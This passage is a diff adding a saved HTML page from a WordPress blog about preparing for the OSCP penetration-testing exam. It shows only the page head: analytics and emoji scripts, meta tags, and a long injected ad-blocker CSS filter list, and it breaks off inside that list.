@@ -1,0 +1,679 @@
+<!DOCTYPE html>
+<!-- saved from url=(0039)https://arjunjaiswal2k18.wordpress.com/ -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="profile" href="http://gmpg.org/xfn/11">
+
+<title>OSCP – My preparation for challenge</title>
+<link rel="dns-prefetch" href="https://s2.wp.com/">
+<link rel="dns-prefetch" href="https://s1.wp.com/">
+<link rel="dns-prefetch" href="https://s0.wp.com/">
+<link rel="dns-prefetch" href="https://fonts.googleapis.com/">
+<link rel="dns-prefetch" href="https://s.pubmine.com/">
+<link rel="dns-prefetch" href="https://x.bidswitch.net/">
+<link rel="dns-prefetch" href="https://static.criteo.net/">
+<link rel="dns-prefetch" href="https://ib.adnxs.com/">
+<link rel="dns-prefetch" href="https://aax.amazon-adsystem.com/">
+<link rel="dns-prefetch" href="https://bidder.criteo.com/">
+<link rel="dns-prefetch" href="https://cas.criteo.com/">
+<link rel="dns-prefetch" href="https://gum.criteo.com/">
+<link rel="dns-prefetch" href="https://ads.pubmatic.com/">
+<link rel="dns-prefetch" href="https://gads.pubmatic.com/">
+<link rel="dns-prefetch" href="https://tpc.googlesyndication.com/">
+<link rel="dns-prefetch" href="https://ad.doubleclick.net/">
+<link rel="dns-prefetch" href="https://googleads.g.doubleclick.net/">
+<link rel="dns-prefetch" href="https://www.googletagservices.com/">
+<link rel="dns-prefetch" href="https://cdn.switchadhub.com/">
+<link rel="dns-prefetch" href="https://delivery.g.switchadhub.com/">
+<link rel="dns-prefetch" href="https://delivery.swid.switchadhub.com/">
+<link rel="alternate" type="application/rss+xml" title="OSCP - My preparation for challenge » Feed" href="https://arjunjaiswal2k18.wordpress.com/feed/">
+<link rel="alternate" type="application/rss+xml" title="OSCP - My preparation for challenge » Comments Feed" href="https://arjunjaiswal2k18.wordpress.com/comments/feed/">
+	<script type="text/javascript">
+		/* <![CDATA[ */
+		function addLoadEvent(func) {
+			var oldonload = window.onload;
+			if (typeof window.onload != 'function') {
+				window.onload = func;
+			} else {
+				window.onload = function () {
+					oldonload();
+					func();
+				}
+			}
+		}
+		/* ]]> */
+	</script>
+			<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s0.wp.com\/wp-content\/mu-plugins\/wpcom-smileys\/twemoji\/2\/72x72\/","ext":".png","svgUrl":"https:\/\/s0.wp.com\/wp-content\/mu-plugins\/wpcom-smileys\/twemoji\/2\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/s1.wp.com\/wp-includes\/js\/wp-emoji-release.min.js?m=1532082729h&ver=4.9.8-RC1-43535"}};
+			!function(a,b,c){function d(a,b){var c=String.fromCharCode;l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,a),0,0);var d=k.toDataURL();l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,b),0,0);var e=k.toDataURL();return d===e}function e(a){var b;if(!l||!l.fillText)return!1;switch(l.textBaseline="top",l.font="600 32px Arial",a){case"flag":return!(b=d([55356,56826,55356,56819],[55356,56826,8203,55356,56819]))&&(b=d([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]),!b);case"emoji":return b=d([55358,56760,9792,65039],[55358,56760,8203,9792,65039]),!b}return!1}function f(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var g,h,i,j,k=b.createElement("canvas"),l=k.getContext&&k.getContext("2d");for(j=Array("flag","emoji"),c.supports={everything:!0,everythingExceptFlag:!0},i=0;i<j.length;i++)c.supports[j[i]]=e(j[i]),c.supports.everything=c.supports.everything&&c.supports[j[i]],"flag"!==j[i]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[j[i]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(h=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",h,!1),a.addEventListener("load",h,!1)):(a.attachEvent("onload",h),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),g=c.source||{},g.concatemoji?f(g.concatemoji):g.wpemoji&&g.twemoji&&(f(g.twemoji),f(g.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script><script src="./OSCP – My preparation for challenge_files/wp-emoji-release.min.js" type="text/javascript" defer=""></script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+<link rel="stylesheet" id="all-css-0-1" href="./OSCP – My preparation for challenge_files/saved_resource" type="text/css" media="all">
+<link rel="stylesheet" id="dara-fonts-css" href="./OSCP – My preparation for challenge_files/css" type="text/css" media="all">
+<link rel="stylesheet" id="all-css-2-1" href="./OSCP – My preparation for challenge_files/saved_resource(1)" type="text/css" media="all">
+<link rel="stylesheet" id="print-css-3-1" href="./OSCP – My preparation for challenge_files/global-print.css" type="text/css" media="print">
+<link rel="stylesheet" id="all-css-4-1" href="./OSCP – My preparation for challenge_files/saved_resource(2)" type="text/css" media="all">
+<script type="text/javascript" src="./OSCP – My preparation for challenge_files/saved_resource(3)"></script>
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://arjunjaiswal2k18.wordpress.com/xmlrpc.php?rsd">
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://s1.wp.com/wp-includes/wlwmanifest.xml"> 
+<meta name="generator" content="WordPress.com">
+<link rel="canonical" href="https://arjunjaiswal2k18.wordpress.com/">
+<link rel="shortlink" href="https://wp.me/P9UOwT-4">
+<link rel="alternate" type="application/json+oembed" href="https://public-api.wordpress.com/oembed/?format=json&amp;url=https%3A%2F%2Farjunjaiswal2k18.wordpress.com%2F&amp;for=wpcom-auto-discovery"><link rel="alternate" type="application/xml+oembed" href="https://public-api.wordpress.com/oembed/?format=xml&amp;url=https%3A%2F%2Farjunjaiswal2k18.wordpress.com%2F&amp;for=wpcom-auto-discovery">
+<!-- Jetpack Open Graph Tags -->
+<meta property="og:type" content="website">
+<meta property="og:title" content="OSCP - My preparation for challenge">
+<meta property="og:url" content="https://arjunjaiswal2k18.wordpress.com/">
+<meta property="og:site_name" content="OSCP - My preparation for challenge">
+<meta property="og:image" content="https://s0.wp.com/i/blank.jpg">
+<meta property="og:locale" content="en_US">
+<meta name="twitter:site" content="@arjunjswl9">
+<meta name="twitter:text:title" content="OSCP Challenge">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:creator" content="@arjunjswl9">
+<meta name="twitter:description" content="Post by @arjunjswl9.">
+<meta property="fb:app_id" content="249643311490">
+<meta property="article:publisher" content="https://www.facebook.com/WordPresscom">
+
+<!-- End Jetpack Open Graph Tags -->
+<link rel="shortcut icon" type="image/x-icon" href="https://s1.wp.com/i/favicon.ico" sizes="16x16 24x24 32x32 48x48">
+<link rel="icon" type="image/x-icon" href="https://s1.wp.com/i/favicon.ico" sizes="16x16 24x24 32x32 48x48">
+<link rel="apple-touch-icon-precomposed" href="https://s2.wp.com/i/webclip.png">
+<link rel="search" type="application/opensearchdescription+xml" href="https://arjunjaiswal2k18.wordpress.com/osd.xml" title="OSCP - My preparation for challenge">
+<link rel="search" type="application/opensearchdescription+xml" href="https://s1.wp.com/opensearch.xml" title="WordPress.com">
+<meta name="application-name" content="OSCP - My preparation for challenge"><meta name="msapplication-window" content="width=device-width;height=device-height"><meta name="msapplication-task" content="name=Subscribe;action-uri=https://arjunjaiswal2k18.wordpress.com/feed/;icon-uri=https://s1.wp.com/i/favicon.ico"><meta name="msapplication-task" content="name=Sign up for a free blog;action-uri=http://wordpress.com/signup/;icon-uri=https://s1.wp.com/i/favicon.ico"><meta name="msapplication-task" content="name=WordPress.com Support;action-uri=http://support.wordpress.com/;icon-uri=https://s1.wp.com/i/favicon.ico"><meta name="msapplication-task" content="name=WordPress.com Forums;action-uri=http://forums.wordpress.com/;icon-uri=https://s1.wp.com/i/favicon.ico"><meta name="description" content="I will not go into background and waste time and would rather come straight to the point. OSCP preparation takes hard work and consistent efforts. The OSCP exam challenge involves exploiting five main machines. Each machine will have different marking depending upon the difficulty level of compromising it. The main aspects of the exam are…">
+		<script type="text/javascript">
+		function __ATA_CC() {var v = document.cookie.match('(^|;) ?personalized-ads-consent=([^;]*)(;|$)');return v ? 1 : 0;}
+		var __ATA_PP = { pt: 0, ht: 0, tn: 'dara', amp: false, siteid: 8982, consent: __ATA_CC() };
+		var __ATA = __ATA || {};
+		__ATA.cmd = __ATA.cmd || [];
+		__ATA.criteo = __ATA.criteo || {};
+		__ATA.criteo.cmd = __ATA.criteo.cmd || [];
+		</script>
+		<script type="text/javascript" src="./OSCP – My preparation for challenge_files/head.js" async=""></script><style type="text/css" id="syntaxhighlighteranchor"></style>
+<script type="text/javascript">
+	window.google_analytics_uacct = "UA-52447-2";
+</script>
+
+<script type="text/javascript">
+	var _gaq = _gaq || [];
+	_gaq.push(['_setAccount', 'UA-52447-2']);
+	_gaq.push(['_setDomainName', 'wordpress.com']);
+	_gaq.push(['_initData']);
+	_gaq.push(['_trackPageview']);
+
+	(function() {
+		var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+		ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+		(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(ga);
+	})();
+</script><script type="text/javascript" async="" src="./OSCP – My preparation for challenge_files/ga.js"></script>
+<style type="text/css">:root topadblock, :root td[valign="top"] > .mainmenu[style="padding:10px 0 0 0 !important;"], :root input[onclick^="window.open('http://www.friendlyduck.com/"], :root img[alt^="Fuckbook"], :root iframe[src^="http://cdn1.adexprt.com/"], :root iframe[src^="http://ad.yieldmanager.com/"], :root div[id^="zergnet-widget"], :root div[id^="mainads"], :root div[id^="dmRosAdWrapper"], :root div[id^="div_ad_stack_"], :root iframe[id^="google_ads_iframe"], :root div[id^="crt-"][style], :root div[id^="cns_ads_"], :root div[id^="ads300_250-widget"], :root iframe[src^="http://cdn2.adexprt.com/"], :root div[id^="ads300_100-widget"], :root div[id^="ads250_250-widget"], :root div[id^="adrotate_widgets-"], :root div[id^="adfox_"], :root div[id^="ad_script_"], :root div[id^="ad-server-"], :root div[id^="acm-ad-tag-"], :root div[id^="MarketGid"], :root div[id^="ADV-SLOT-"], :root div[data-native_ad], :root div[class^="proadszone-"], :root div[class^="local-feed-banner-ads"], :root div[class^="block-openx-"], :root div[class^="ads-partner-"], :root div[class^="ad_position_"], :root div[class^="ad_border_"], :root div[class^="Ad__container"], :root div[class^="Ad__bigBox"], :root div[id^="div-adtech-ad-"], :root div[class*="_AdInArticle_"], :root div[class$="dealnews"] > .dealnews, :root div > [class][onclick*=".updateAnalyticsEvents"], :root bottomadblock, :root aside[itemtype="https://schema.org/WPAdBlock"], :root aside[id^="div-gpt-ad"], :root div[id^="ad-cid-"], :root aside[id^="advads_ad_widget-"], :root aside[id^="adrotate_widgets-"], :root a[target="_blank"][href^="http://api.taboola.com/"], :root a[style="display:block;width:300px;min-height:250px"][href^="http://li.cnet.com/click?"], :root a[onmousedown^="this.href='https://paid.outbrain.com/network/redir?"][target="_blank"] + .ob_source, :root a[onmousedown^="this.href='http://staffpicks.outbrain.com/network/redir?"][target="_blank"] + .ob_source, :root a[onmousedown^="this.href='http://staffpicks.outbrain.com/network/redir?"][target="_blank"], :root a[onmousedown^="this.href='http://paid.outbrain.com/network/redir?"][target="_blank"] + .ob_source, :root a[onmousedown^="this.href='/wp-content/embed-ad-content/"], :root a[href^="https://www.share-online.biz/affiliate/"], :root a[href^="https://www.oboom.com/ad/"], :root a[href^="https://www.firstload.com/affiliate/"], :root a[href^="https://www.financeads.net/tc.php?"], :root a[href^="https://www.camyou.com/?cam="][href*="&track="], :root a[href^="https://www.camsoda.com/enter.php?id="], :root a[href^="https://www.bebi.com"], :root a[href^="https://www.adskeeper.co.uk/"], :root a[href^="https://windscribe.com/promo/"], :root a[href^="https://trust.zone/go/r.php?RID="], :root a[href^="https://tracking.truthfinder.com/?a="], :root a[href^="https://track.clickmoi.xyz/"], :root div[class^="gemini-ad"], :root a[href^="https://torguard.net/aff.php"], :root a[href^="https://t.mobtya.com/"], :root a[href^="https://syndication.exoclick.com/splash.php?"], :root div[id^="YFBMSN"], :root a[href^="https://secure.eveonline.com/ft/?aid="], :root a[href^="https://redirect.ero-advertising.com/"], :root a[href^="https://pubads.g.doubleclick.net/"], :root div[id^="proadszone-"], :root a[href^="https://mk-ads.com/"], :root a[href^="https://members.linkifier.com/public/affiliateLanding?refCode="], :root a[href^="https://go.stripchat.com/"][href*="&campaignId="], :root div[class^="BlockAdvert-"], :root a[href^="https://go.onclasrv.com/"], :root a[href^="https://go.ad2up.com/"], :root a[href^="https://farm.plista.com/pets"], :root a[href^="https://evaporate.pw/"], :root a[href^="https://click.plista.com/pets"], :root a[href^="https://chaturbate.com/affiliates/"], :root a[href^="https://www.googleadservices.com/pagead/aclk?"], :root a[href^="https://awentw.com/"], :root a[href^="https://servedbyadbutler.com/"], :root a[href^="https://affiliates.bet-at-home.com/processing/"], :root a[href^="https://adhealers.com/"], :root a[href^="https://ad.atdmt.com/"], :root a[href^="http://xtgem.com/click?"], :root a[href^="http://wxdownloadmanager.com/dl/"], :root a[href^="http://www.zergnet.com/i/"], :root a[href^="http://www.usearchmedia.com/signup?"], :root a[href^="http://www.torntv-downloader.com/"], :root a[href^="http://www.tirerack.com/affiliates/"], :root a[href^="http://www.text-link-ads.com/"], :root div[id^="div_openx_ad_"], :root a[href^="http://www.streamate.com/exports/"], :root a[href^="http://www.sfippa.com/"], :root a[href^="http://www.xmediaserve.com/"], :root a[href^="http://www.sex.com/videos/?utm_"], :root a[href^="http://www.sex.com/?utm_"], :root a[onmousedown^="this.href='http://paid.outbrain.com/network/redir?"][target="_blank"], :root a[href^="http://www.roboform.com/php/land.php"], :root a[href^="http://www.quick-torrent.com/download.html?aff"], :root a[href^="http://www.pinkvisualgames.com/?revid="], :root a[href^="http://www.paddypower.com/?AFF_ID="], :root div[data-spotim-slot], :root a[href^="http://www.mysuperpharm.com/"], :root a[href^="http://www.myfreepaysite.com/sfw_int.php?aid"], :root a[href^="http://www.myfreepaysite.com/sfw.php?aid"], :root a[href^="http://www.myfreecams.com/?co_id="][href*="&track="], :root a[href^="http://www.moneyducks.com/"], :root a[href^="http://www.menaon.com/installs/"], :root a[href^="http://www.securegfm.com/"], :root a[href^="http://www.liversely.net/"], :root a[href^="http://www.linkbucks.com/referral/"], :root a[href^="http://www.ireel.com/signup?ref"], :root a[href^="http://www.incredimail.com/?id="], :root a[href^="http://www.idownloadplay.com/"], :root a[href^="http://www.hitcpm.com/"], :root a[href^="http://www.greenmangaming.com/?tap_a="], :root a[href^="http://www.getyourguide.com/?partner_id="], :root a[href^="http://www.gamebookers.com/cgi-bin/intro.cgi?"], :root a[href^="http://www.friendlyquacks.com/"], :root a[href^="http://www.fpcTraffic2.com/blind/in.cgi?"], :root a[href^="http://www.fonts.com/BannerScript/"], :root a[href^="http://www.fleshlight.com/"], :root a[href^="http://www.flashx.tv/downloadthis"], :root a[href^="http://www.firstload.de/affiliate/"], :root a[href^="http://www.fducks.com/"], :root a[href^="http://www.faceporn.net/free?"], :root a[href^="http://www.epicgameads.com/"], :root a[href^="http://www.easydownloadnow.com/"], :root a[href^="http://www.duckssolutions.com/"], :root a[href^="http://www.duckcash.eu/"], :root a[href^="http://www.drowle.com/"], :root a[onmousedown^="this.href='https://paid.outbrain.com/network/redir?"][target="_blank"], :root a[href^="http://www.downloadweb.org/"], :root a[href^="http://www.downloadthesefiles.com/"], :root a[href^="http://www.installads.net/"], :root a[href^="http://www.download-provider.org/"], :root a[href^="http://www.down1oads.com/"], :root iframe[id^="google_ads_frame"], :root a[href^="http://www.dealcent.com/register.php?affid="], :root a[href^="http://www.clkads.com/adServe/"], :root a[href^="http://www.clickansave.net/"], :root a[href^="http://www.cash-duck.com/"], :root a[href^="http://www.bet365.com/"][href*="&affiliate="], :root a[href^="http://www.badoink.com/go.php?"], :root a[href^="http://ad-emea.doubleclick.net/"], :root a[href^="http://www.adskeeper.co.uk/"], :root a[href^="http://www.ragazzeinvendita.com/?rcid="], :root a[href^="http://www.adbrite.com/mb/commerce/purchase_form.php?"], :root a[href^="http://www.brightwheel.info/"], :root a[href^="http://www.1clickdownloader.com/"], :root a[href^="http://www.123-reg.co.uk/affiliate2.cgi"], :root div[id^="lazyad-"], :root a[href^="http://wopertific.info/"], :root a[href^="http://see-work.info/"], :root a[href^="http://prousa.work/"], :root a[href^="http://websitedhoome.com/"], :root a[href^="http://uploaded.net/ref/"], :root a[href^="http://www.graboid.com/affiliates/"], :root a[href^="http://tracking.toroadvertising.com/"], :root a[data-url^="http://paid.outbrain.com/network/redir?"], :root a[href^="http://www.bluehost.com/track/"] > img, :root a[data-redirect^="http://paid.outbrain.com/network/redir?"], :root a[href^="http://track.affiliatenetwork.co.za/"], :root a[href^="http://track.adform.net/"], :root a[href^="http://t.wowtrk.com/"], :root a[href^="http://adprovider.adlure.net/"], :root a[href^="http://tezfiles.com/pr/"], :root .mw > #rcnt > #center_col > #taw > .c, :root a[href^="http://taboola-"][href*="/redirect.php?app.type="], :root a[href^="http://t.mdn2015x3.com/"], :root a[href^="http://clickandjoinyourgirl.com/"], :root a[href^="http://webtrackerplus.com/"], :root a[href^="http://b.bestcompleteusa.info/"], :root a[href^="http://t.mdn2015x2.com/"], :root a[href^="http://www.seekbang.com/cs/"], :root a[href^="http://bluehost.com/track/"], :root a[href^="http://syndication.exoclick.com/"], :root a[href^="http://steel.starflavor.bid/"], :root a[href^="http://sharesuper.info/"], :root a[href^="http://getlinksinaseconds.com/"], :root a[href^="http://secure.signup-way.com/"], :root a[href*=".clkcln.com/"], :root a[href^="http://secure.signup-page.com/"], :root [onclick^="window.open('http://adultfriendfinder.com/search/"], :root a[href^="http://secure.hostgator.com/~affiliat/"], :root a[href^="http://ryushare.com/affiliate.python"], :root a[href^="http://record.commissionking.com/"], :root div[class*="-storyBodyAd-"], :root a[href^="http://record.betsafe.com/"], :root a[href^="http://gca.sh/user/register?ref="], :root a[href^="http://promos.bwin.com/"], :root a[href^="http://prochina.link/"], :root a[href^="http://z1.zedo.com/"], :root a[href^="http://pokershibes.com/index.php?ref="], :root .ra[width="30%"][align="right"] + table[width="70%"][cellpadding="0"], :root a[href^="http://searchtabnew.com/"], :root a[href^="http://pan.adraccoon.com?"], :root a[href^="http://n217adserv.com/"], :root a[href^="http://mojofun.info/"], :root a[href^="http://mmo123.co/"], :root a[href^="http://media.paddypower.com/redirect.aspx?"], :root a[href^="http://www.bitlord.me/share/"], :root a[href^="http://www.socialsex.com/"], :root a[href^="http://www.affbuzzads.com/affiliate/"], :root a[href*=".qertewrt.com/"], :root a[href^="http://lp.ncdownloader.com/"], :root #rhs_block .xpdopen > ._OKe > div > .mod > ._yYf, :root a[href^="http://lp.ezdownloadpro.info/"], :root a[href^="https://ads.ad4game.com/"], :root a[href*="/adServe/banners?"], :root a[href^="http://liversely.com/"], :root a[href^="http://latestdownloads.net/download.php?"], :root a[href^="http://keep2share.cc/pr/"], :root a[href^="http://k2s.cc/pr/"], :root a[href^="http://k2s.cc/code/"], :root a[href^="http://www.liutilities.com/"], :root a[href^="http://www.dl-provider.com/search/"], :root a[href^="http://tracking.deltamediallc.com/"], :root a[href*=".bang.com/"][href*="&aff="], :root a[href^="http://join3.bannedsextapes.com/track/"], :root a[href^="http://green.trafficinvest.com/"], :root a[href^="http://jobitem.org/"], :root a[href^="//adbit.co/?a=Advertise&"], :root a[href^="http://istri.it/?"], :root a[href^="https://dltags.com/"], :root a[href^="http://onclickads.net/"], :root a[href^="http://www.terraclicks.com/"], :root a[href^="http://www.coinducks.com/"], :root a[href^="http://internalredirect.site/"], :root a[href^="http://cdn.adstract.com/"], :root a[href^="http://hyperlinksecure.com/go/"], :root a[href^="http://pubads.g.doubleclick.net/"], :root a[href^="http://www.myvpn.pro/"], :root a[href^="http://hyperies.info/"], :root a[href^="http://hpn.houzz.com/"], :root a[href^="http://greensmoke.com/"], :root a[href^="http://farm.plista.com/pets"], :root a[href^="http://mo8mwxi1.com/"], :root div[class^="ResponsiveAd-"], :root a[href^="http://www.revenuehits.com/"], :root a[href^="http://go.seomojo.com/tracking202/"], :root div[id^="block-views-topheader-ad-block-"], :root a[href^="http://go.oclaserver.com/"], :root .__y_elastic .__y_item, :root a[href^="http://go.mobisla.com/"], :root div[id^="advads-"], :root a[href^="http://www.ringtonematcher.com/"], :root a[href^="http://www.adshost2.com/"], :root a[href^="//srv.buysellads.com/"], :root a[href^="http://g1.v.fwmrm.net/ad/"], :root a[href^="http://us.marketgid.com"], :root A[href^="https://www.friendlyduck.com/AF_"], :root a[href^="http://imads.integral-marketing.com/"], :root a[href^="http://freesoftwarelive.com/"], :root a[href^="http://adtrackone.eu/"], :root a[href^="http://finaljuyu.com/"], :root a[href^="http://tour.affbuzzads.com/"], :root a[href^="http://fileupnow.rocks/"], :root a[href^="http://fileloadr.com/"], :root a[href^="http://extra.bet365.com/"][href*="?affiliate="], :root a[href^="http://elitefuckbook.com/"], :root div[id^="ads300_600-widget"], :root div[class^="Ad__adContainer"], :root a[href^="http://web.adblade.com/"], :root a[href^="http://elite-sex-finder.com/?"], :root a[href^="http://webgirlz.online/landing/"], :root a[href^="http://eclkmpsa.com/"], :root a[href^="http://dethao.com/"], :root a[href^="http://ddownload39.club/"], :root a[href^="http://data.committeemenencyclopedicrepertory.info/"], :root a[href^="https://understandsolar.com/signup/?lead_source="][href*="&tracking_code="], :root a[href^="http://hdplugin.flashplayer-updates.com/"], :root a[href^="http://data.ad.yieldmanager.net/"], :root #content > #center > .dose > .dosesingle, :root a[href^="http://campaign.bharatmatrimony.com/track/"], :root a[href^="http://d2.zedo.com/"], :root a[href^="http://contractallsticker.net/"], :root a[href^="http://codec.codecm.com/"], :root div[id^="ads120_600-widget"], :root a[href^="http://clk.directrev.com/"], :root a[href^="http://refer.webhostingbuzz.com/"], :root a[href^="https://paid.outbrain.com/network/redir?"], :root a[href^="http://clickserv.sitescout.com/"], :root a[href*=".intab.fun/"], :root a[href^="http://clicks.guamwnvgashbkashawhgkhahshmashcas.pw/"], :root a[href^="http://www.downloadplayer1.com/"], :root a[href^="http://clicks.binarypromos.com/"], :root a[href^="https://dediseedbox.com/clients/aff.php?"], :root a[href^="http://www.wantstraffic.com/"], :root .lads[width="100%"][style="background:#FFF8DD"], :root a[href^="http://databass.info/"], :root a[href^="http://www.urmediazone.com/signup"], :root a[href^="http://ads.pheedo.com/"], :root a[href^="http://click.plista.com/pets"], :root a[href^="http://chaturbate.com/affiliates/"], :root a[href^="http://www.friendlyadvertisements.com/"], :root a[href^="http://cdn3.adbrau.com/"], :root a[href^="http://get.slickvpn.com/"], :root a[href*="/adrotate-out.php?"], :root a[href^="http://track.trkvluum.com/"], :root a[href^="http://2pxg8bcf.top/"], :root a[href^="http://cpaway.afftrack.com/"], :root a[href^="http://cdn.adsrvmedia.net/"], :root a[href^="http://360ads.go2cloud.org/"], :root a[href^="http://dftrck.com/"], :root a[href^="http://casino-x.com/?partner"], :root a[href^="http://campeeks.com/"][href*="&utm_"], :root a[href^="http://www.on2url.com/app/adtrack.asp"], :root #\5f _nq__hh[style="display:block!important"], :root a[href^="http://guideways.info/"], :root a[href^="http://campaign.bharatmatrimony.com/cbstrack/"], :root a[href^="http://ads.expekt.com/affiliates/"], :root a[href^="http://callville.xyz/"], :root div[itemtype="http://schema.org/WPAdBlock"], :root a[href^="http://xads.zedo.com/"], :root a[href^="http://c.jumia.io/"], :root a[href^="http://down1oads.com/"], :root a[href^="http://buysellads.com/"], :root a[href^="http://serve.williamhill.com/promoRedirect?"], :root a[href^="http://feedads.g.doubleclick.net/"], :root a[href^="http://bs.serving-sys.com/"], :root a[href^="http://bonusfapturbo.nmvsite.com/"], :root a[href^="http://betahit.click/"], :root a[href^="http://cinema.friendscout24.de?"], :root [lazy-ad="lefttop_banner"], :root a[href^="http://servicegetbook.net/"], :root a[href^="https://trklvs.com/"], :root a[href^="http://bestorican.com/"], :root a[href^="http://bcp.crwdcntrl.net/"], :root a[href^="http://bc.vc/?r="], :root a[href^="http://banners.victor.com/processing/"], :root a[href^="http://install.securewebsiteaccess.com/"], :root .inlineNewsletterSubscription + .inlineNewsletterSubscription div[class$="_item"], :root a[href^="http://clkmon.com/adServe/"], :root a[href^="http://www.torntvdl.com/"], :root a[href^="http://at.atwola.com/"], :root a[href^="//88d7b6aa44fb8eb.com/"], :root a[href^="http://api.ringtonematcher.com/"], :root a[href^="http://www.fbooksluts.com/"], :root a[href^="http://www.cdjapan.co.jp/aff/click.cgi/"], :root a[href^="http://c.actiondesk.com/"], :root div[id^="ad-position-"], :root a[href^="http://affiliate.glbtracker.com/"], :root a[href^="http://anonymous-net.com/"], :root a[href^="https://www.dsct1.com/"], :root a[href^="http://amzn.to/"] > img[src^="data"], :root .icons-rss-feed + .icons-rss-feed div[class$="_item"], :root a[href^="http://aflrm.com/"], :root a[href^="http://affiliates.pinnaclesports.com/processing/"], :root a[href^="http://affiliate.godaddy.com/"], :root a[href^="http://partner.sbaffiliates.com/"], :root a[href^="http://affiliate.coral.co.uk/processing/"], :root a[href^="http://aff.ironsocket.com/"], :root a[href^="http://zevera.com/afi.html"], :root a[href^="http://adsrv.keycaptcha.com"], :root a[href^="http://adserving.unibet.com/"], :root a[href^="https://bs.serving-sys.com"], :root a[href^="https://atomidownload.com/"], :root a[href^="http://adtransfer.net/"], :root a[href^="http://adserver.itsfogo.com/"], :root iframe[src^="http://static.mozo.com.au/strips/"], :root a[href^="https://www.spyoff.com/"], :root AD-TRIPLE-BOX, :root a[href^="http://ads2.williamhill.com/redirect.aspx?"], :root a[href^="https://secure.adnxs.com/clktrb?"], :root a[href^="http://adserver.adtechus.com/"], :root .__ywvr .__y_item, :root a[href^="http://download-performance.com/"], :root #\5f _mom_ad_12, :root a[href^="http://ads.integral-marketing.com/"], :root a[href^="http://adserver.adtech.de/"], :root a[href^="http://ads.betfair.com/redirect.aspx?"], :root a[href^="http://ads.affbuzzads.com/"], :root a[href^="http://online.ladbrokes.com/promoRedirect?"], :root a[href^="http://ads.ad-center.com/"], :root a[href^="http://admingame.info/"], :root div[id^="q1-adset-"], :root a[href^="http://adfarm.mediaplex.com/"], :root #center_col > #taw > #tvcap > .rscontainer, :root a[href^="http://adf.ly/?id="], :root a[href^="http://goldmoney.com/?gmrefcode="], :root a[href^="http://adexprt.me/"], :root a[href^="http://www.sex.com/pics/?utm_"], :root a[href^="http://engine.newsmaxfeednetwork.com/"], :root a[href^="http://www.plus500.com/?id="], :root #flowplayer > div[style="z-index: 208; position: absolute; width: 300px; height: 275px; left: 222.5px; top: 85px;"], :root a[href^="http://ad.yieldmanager.com/"], :root a[href^="http://ad.doubleclick.net/"], :root a[href^="http://abc2.mobile-10.com/"], :root a[href^="http://NowDownloadAll.com"], :root a[href^="http://www.ducksnetwork.com/"], :root a[href^="http://3wr110.net/"], :root a[href^="http://www5.smartadserver.com/call/pubjumpi/"], :root a[href^="//ads.ad-center.com/"], :root a[href^="http://1phads.com/"], :root a[href^="http://adserving.liveuniversenetwork.com/"], :root a[href^="https://chaturbate.com/in/?track="], :root a[href^="http://www1.clickdownloader.com/"], :root a[href^="//tracking.content-recommendation.net/"][href*="/sponsored/click.html?"], :root #center_col > #resultStats + div[style="border:1px solid #dedede;margin-bottom:11px;padding:5px 7px 5px 6px"], :root a[href^="https://www.secureupload.eu/suprerefid="], :root a[href^="http://yads.zedo.com/"], :root #mbEnd[cellspacing="0"][cellpadding="0"], :root a[href^="http://adclick.g.doubleclick.net/"], :root a[href^="//t.MtagMonetizationA.com/"], :root a[href^="//nlkdom.com/"], :root #MAIN.ShowTopic > .ad, :root a[href^="http://findersocket.com/"], :root a[href^="http://cdn3.adexprts.com/"], :root a[href^="//jsmptjmp.com/"], :root a[href^="//go.onclasrv.com/"], :root a[href^="http://games.ucoz.ru/"][target="_blank"], :root [id*="ScriptRoot"], :root div[id^="advads_"], :root a[href^="//db52cc91beabf7e8.com/"], :root #\5f _mom_ad_2, :root a[href^="http://ads.activtrades.com/"], :root a[href^="//api.ad-goi.com/"], :root a[href^="http://www.sexgangsters.com/?pid="], :root a[href^="http://www.amazon.co.uk/exec/obidos/external-search?"], :root div[id^="google_ads_iframe_"], :root a[href^="http://www.pheedo.com/"], :root a[href^="http://www.affiliates1128.com/processing/"], :root #mn div[style="position:relative"] > #center_col > ._Ak, :root [ad-id^="googlead"], :root a[href^="http://www.afgr3.com/"], :root div[id^="google_dfp_"], :root a[href^="//5e1fcb75b6d662d.com/"], :root #content > #right > .dose > .dosesingle, :root a[href^="http://9nl.es/"], :root #center_col > #resultStats + div + #res + #tads, :root a[href^="//40ceexln7929.com/"], :root a[href^="//00ae8b5a9c1d597.com/"], :root a[href^="http://www.firstclass-download.com/"], :root a[href*=".trust.zone"], :root a[href^="http://adrunnr.com/"], :root div[id^="div-gpt-ad"], :root a[href^="http://fusionads.net"], :root a[href^=" http://www.sex.com/"][href*="&utm_"], :root a[href^="https://keep2share.cc/pr/"], :root [onclick*="content.ad/"], :root div[class^="awpcp-random-ads"], :root 